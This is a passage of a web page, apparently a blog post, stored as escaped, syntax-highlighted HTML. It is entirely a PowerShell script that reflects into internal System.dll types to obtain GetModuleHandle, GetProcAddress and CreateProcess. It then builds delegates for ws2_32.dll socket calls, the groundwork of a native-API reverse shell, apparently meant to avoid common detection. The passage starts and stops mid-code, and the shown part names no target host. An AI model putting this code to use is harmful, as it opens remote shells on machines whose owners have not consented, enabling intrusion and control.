class=\"mf\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003efilter\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-Type\u003c/span\u003e \u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"nv\"\u003e$dllName\u003c/span\u003e\u003cspan class=\"p\"\u003e,[\u003c/span\u003e\u003cspan class=\"no\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"nv\"\u003e$typeName\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGlobalAssemblyCache\u003c/span\u003e \u003cspan class=\"o\"\u003e-And\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eLocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eSplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mf\"\u003e-1\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"py\"\u003eEquals\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$dllName\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetType\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$typeName\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-Function\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eParam\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$module\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$function\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"nv\"\u003e$GetModuleHandle\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-or\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"nv\"\u003e$GetProcAddress\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Error: GetModuleHandle and GetProcAddress must be initialized first!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$moduleHandle\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$GetModuleHandle\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$module\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$GetProcAddress\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$moduleHandle\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$function\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-Delegate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eParam\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nb\"\u003eParameter\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003ePosition\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003eMandatory\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"vm\"\u003e$True\u003c/span\u003e\u003cspan class=\"p\"\u003e)]\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eIntPtr\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$funcAddr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nb\"\u003eParameter\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003ePosition\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003eMandatory\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"vm\"\u003e$True\u003c/span\u003e\u003cspan class=\"p\"\u003e)]\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eType[]\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$argTypes\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nb\"\u003eParameter\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003ePosition\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)]\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eType\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$retType\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eVoid\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eAppDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eCurrentDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDefineDynamicAssembly\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eReflection\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eAssemblyName\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;QD\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Reflection.Emit.AssemblyBuilderAccess\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eRun\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eDefineDynamicModule\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;QM\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e$false\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eDefineType\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;QT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Class, Public, Sealed, AnsiClass, AutoClass\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.MulticastDelegate\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDefineConstructor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;RTSpecialName, HideBySig, Public\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Reflection.CallingConventions\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eStandard\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$argTypes\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eSetImplementationFlags\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Runtime, Managed\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDefineMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Invoke\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Public, HideBySig, NewSlot, Virtual\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$retType\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$argTypes\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eSetImplementationFlags\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Runtime, Managed\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$delegate\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eCreateType\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Runtime.InteropServices.Marshal\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eGetDelegateForFunctionPointer\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$funcAddr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$delegate\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Obtain the required types from the already loaded System.dll assembly\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$assemblies\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eAppDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eCurrentDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetAssemblies\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$unsafeMethodsType\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$assemblies\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Type\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;System.dll\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Microsoft.Win32.UnsafeNativeMethods\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$nativeMethodsType\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$assemblies\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Type\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;System.dll\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Microsoft.Win32.NativeMethods\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$startupInformationType\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$assemblies\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Type\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;System.dll\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Microsoft.Win32.NativeMethods+STARTUPINFO\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$processInformationType\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$assemblies\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Type\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;System.dll\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Obtain the methods: GetModuleHandle, GetProcAddress and CreateProcess\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$GetModuleHandle\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$unsafeMethodsType\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;GetModuleHandle\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$GetProcAddress\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$unsafeMethodsType\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;GetProcAddress\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003ereflection.bindingflags\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Public,Static\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Reflection.CallingConventions\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eAny\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.IntPtr], [string\u003c/span\u003e\u003cspan class=\"p\"\u003e]),\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$CreateProcess\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$nativeMethodsType\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetMethod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CreateProcess\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Dynamically lookup the required WSA function addresses from ws2_23.dll\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$ConnectAddr\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Function\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ws2_32.dll\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;connect\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$WSASocketAddr\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Function\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ws2_32.dll\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;WSASocketA\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$WSAStartupAddr\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Function\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ws2_32.dll\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;WSAStartup\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$CloseSocketAddr\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Function\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ws2_32.dll\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;closesocket\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Create delegate types for the dynamically looked up WSA function addresses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$CloseSocket\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Delegate\u003c/span\u003e \u003cspan class=\"nv\"\u003e$CloseSocketAddr\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan 